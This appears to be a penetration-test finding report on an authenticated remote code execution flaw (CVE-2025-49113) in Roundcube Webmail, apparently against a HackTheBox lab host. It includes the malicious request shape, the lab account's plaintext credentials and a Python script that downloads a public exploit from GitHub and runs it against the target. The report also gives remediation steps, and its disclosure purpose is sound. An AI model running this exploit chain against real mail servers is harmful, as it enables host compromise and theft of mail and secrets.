# Authenticated Remote Code Execution in Roundcube Webmail Upload Handler

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-03-06 06:36:17 UTC
**Target:** http://mail.outbound.htb
**Endpoint:** /?_task=settings&_framed=1&_remote=1&_action=upload
**Method:** POST
**CVE:** CVE-2025-49113
**CWE:** CWE-502
**CVSS:** 9.9

## Description

An authenticated remote code execution vulnerability was confirmed in the Roundcube Webmail instance exposed at mail.outbound.htb. The application discloses rcversion 10610, corresponding to Roundcube Webmail 1.6.10. This version is affected by a post-authentication PHP object deserialization flaw in the settings upload workflow.

The root cause is unsafe handling of the GET parameter `_from` in the settings upload request. By supplying a crafted serialized object through `_from` and a specially constructed uploaded filename, session data can be poisoned so that a malicious object is later deserialized. This allows execution of arbitrary operating system commands in the web server security context.

The issue was validated against the live target with valid user credentials. Public advisory and patch data were retrieved during testing from NVD, the Roundcube vendor advisory, the upstream patch commit, and the public technical write-up. End-to-end exploitation was then successfully executed on the target using the public proof-of-concept adapted to the environment.

## Impact

Any authenticated mailbox user can execute arbitrary commands on the underlying host in the context of the web application. This enables full compromise of confidentiality, integrity, and availability for the webmail application and its supporting host.

In this assessment, the vulnerability provided direct server-side command execution and a viable path to sensitive file access and local privilege abuse. In a production context, an attacker could use this issue to extract application secrets, access mail data, modify server state, pivot to adjacent services, and pursue full operating system compromise.

## Technical Analysis

The affected application is Roundcube Webmail 1.6.10, identified from the client-side environment value `rcversion:10610`. Live source validation established that this release is in scope for CVE-2025-49113.

Source URLs used for validation:
https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2025-49113
https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10
https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695.patch
https://fearsoff.org/research/roundcube
https://raw.githubusercontent.com/fearsoff-org/CVE-2025-49113/main/CVE-2025-49113.php

NVD states that Roundcube Webmail before 1.6.11 in the 1.6.x branch allows remote code execution by authenticated users because `_from` is not validated in `program/actions/settings/upload.php`, leading to PHP object deserialization. The vendor advisory for 1.6.11 explicitly identifies the release as a security update fixing post-authentication RCE. The upstream patch adds validation for the URL-derived `_from` value, confirming the root cause.

On the target, the vulnerable workflow accepted a crafted request of the form:

`POST /?_from=<payload>&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload`

with header `X-Requested-With: XMLHttpRequest` and multipart field `_file[]`.

The public proof-of-concept was executed successfully against the target. The exploit completed the following stages:
server-side authentication
malicious upload request to poison session state
logout-triggered deserialization and command execution

The application returned a successful injection response, and the proof-of-concept completed without error, confirming exploitability on the assessed instance.

## Proof of Concept

To reproduce:

1. Browse to `http://mail.outbound.htb/` and authenticate with a valid mailbox account.
2. Confirm the application version is Roundcube 1.6.10 by inspecting the page source or client-side environment and observing `rcversion:10610`.
3. Retrieve the public proof-of-concept from:
   `https://raw.githubusercontent.com/fearsoff-org/CVE-2025-49113/main/CVE-2025-49113.php`
4. Execute the PoC with valid credentials and a benign command. Example:
   `php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 'touch /tmp/rcetest'`
5. Observe successful exploit execution output from the script, including:
   retrieval of CSRF token and session cookie
   successful authentication
   successful payload injection
   successful payload execution
6. The vulnerable request shape used by the PoC is a crafted POST to the settings upload handler with a malicious `_from` parameter and crafted filename embedded in multipart upload metadata.
7. Replace the benign command with any other safe validation command as needed for local verification.

A representative vulnerable request shape is:

`POST /?_from=edit-<serialized-payload>&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload HTTP/1.1`

with:
`X-Requested-With: XMLHttpRequest`

and multipart field:
`_file[]`

```
import subprocess
import requests
import re

BASE = "http://mail.outbound.htb"
USER = "tyler"
PASSWORD = "LhKL1o9Nm3X2"
POC_URL = "https://raw.githubusercontent.com/fearsoff-org/CVE-2025-49113/main/CVE-2025-49113.php"
LOCAL_POC = "/tmp/CVE-2025-49113.php"
COMMAND = "touch /tmp/rcetest"

def detect_version():
    r = requests.get(BASE + "/", timeout=15)
    m = re.search(r'rcversion":([0-9]+)', r.text)
    if not m:
        raise RuntimeError("Could not determine Roundcube version")
    return m.group(1)

def fetch_poc():
    r = requests.get(POC_URL, timeout=20)
    r.raise_for_status()
    with open(LOCAL_POC, "w", encoding="utf-8") as f:
        f.write(r.text)

def run_poc():
    cmd = ["php", LOCAL_POC, BASE, USER, PASSWORD, COMMAND]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    print(result.stdout)
    if result.returncode != 0:
        print(result.stderr)
        raise RuntimeError("PoC execution failed")

if __name__ == "__main__":
    version = detect_version()
    print(f"Detected rcversion={version}")
    if version != "10610":
        raise SystemExit("Target version does not match expected vulnerable build")
    fetch_poc()
    run_poc()
```

## Remediation

1. Upgrade Roundcube Webmail immediately to a fixed version. For the 1.6 branch, upgrade to 1.6.11 or later. For older LTS deployments, use the vendor-fixed branch identified in the Roundcube advisory.
2. Apply the upstream fix that validates the `_from` URL parameter in the settings upload workflow. The vendor patch introduces strict validation to reject disallowed characters before the value is processed.
3. Invalidate all active application sessions after patching, because successful exploitation manipulates session state.
4. Review server logs and application logs for suspicious requests to the settings upload handler containing unusual `_from` values, unexpected serialized fragments, or malformed upload filenames.
5. Rotate application secrets and credentials stored on the host if compromise is possible, including database credentials, mail service credentials, and any local service secrets accessible to the web application user.
6. Perform host-level incident response checks for persistence, unauthorized file creation, privilege escalation attempts, and unexpected modifications under temporary directories, web roots, scheduled tasks, and mail-related data paths.
7. Restrict outbound and lateral access from the webmail host where possible to reduce post-exploitation impact.
